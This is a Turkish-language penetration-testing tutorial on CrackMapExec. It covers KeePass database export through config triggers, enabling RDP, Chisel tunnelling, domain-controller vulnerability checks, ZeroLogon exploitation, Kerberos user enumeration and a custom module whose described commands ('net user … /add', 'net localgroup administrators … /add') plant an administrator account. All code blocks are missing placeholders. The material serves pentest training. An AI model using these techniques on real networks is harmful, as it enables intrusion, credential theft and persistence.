Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


